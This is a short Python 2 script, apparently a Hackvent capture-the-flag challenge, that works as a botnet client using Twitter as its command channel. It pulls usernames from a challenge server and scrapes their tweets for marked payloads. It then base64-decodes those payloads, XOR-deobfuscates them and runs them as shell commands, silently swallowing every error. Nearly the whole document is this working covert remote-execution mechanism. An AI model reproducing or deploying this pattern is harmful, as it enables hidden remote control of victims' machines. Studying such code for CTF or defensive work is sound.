import base64, os, re, urllib2
from easyprocess import EasyProcess

def x(t): return ''.join([chr(ord(t[i])^[0x66, 0x66, 0x66, 0x13, 0x37, 0x42, 0x69, 0x33, 0x01, 0x13][i%10]) for i in range(len(t))])

''' what this does:
    1. query twitter suburls from HV challenge server
    2. read tweet, search for "MUFFIN_BOTNET:FOO==:MUFFIN_BOTNET"
    3. b64decode FOO=== and execute it
'''

def ok_cool(c):
    try: c = x(base64.b64decode(c)); EasyProcess(c).call(timeout=2)
    except: pass

def wtf(n):
    t = b'https://twitter.com/' + n; cs = []
    try: c_txt = urllib2.urlopen(t).read(); cs = re.findall(b'TweetTextSize(.*)</p', c_txt)
    except: pass
    for c in cs:
        try:
            c = c[c.index('>')+1:]
            if '<a href="/muffiniks" class="twitter-atreply pretty-link js-nav" dir="ltr" data-mentioned-user-id="764117042274373632" ><s>@</s><b>muffiniks</b></a> <a href="/hashtag/hackvent?src=hash" data-query-source="hashtag_click" class="twitter-hashtag pretty-link js-nav" dir="ltr" ><s>#</s><b>hackvent</b></a> <a href="https://t.co/MtJMTespOL" rel="nofollow noopener" dir="ltr" data-expanded-url="http://hackvent.hacking-lab.com" class="twitter-timeline-link" target="_blank" title="http://hackvent.hacking-lab.com" ><span class="tco-ellipsis"></span><span class="invisible">http://</span><span class="js-display-url">hackvent.hacking-lab.com</span><span class="invisible"></span><span class="tco-ellipsis"><span class="invisible">&nbsp;</span></span></a> ' in c:
                c = c[c.index(b'MUFFIN_BOTNET:')+len(b'MUFFIN_BOTNET:'):]; c = c[:c.index(b':MUFFIN_BOTNET')]; ok_cool(c)
        except: pass

def ohai():
    ''' Run wtf() on all URLs returned by hv-webserver'''
    ns = []
    try:
        n_txt = urllib2.urlopen(b'http://challenges.hackvent.hacking-lab.com:8081/?twitter').read();
        ns = list(set([n for n in n_txt.split('|') if len(n) > 1])) # list of uniques
    except: pass
    for n in ns: wtf(n)

#ohai()
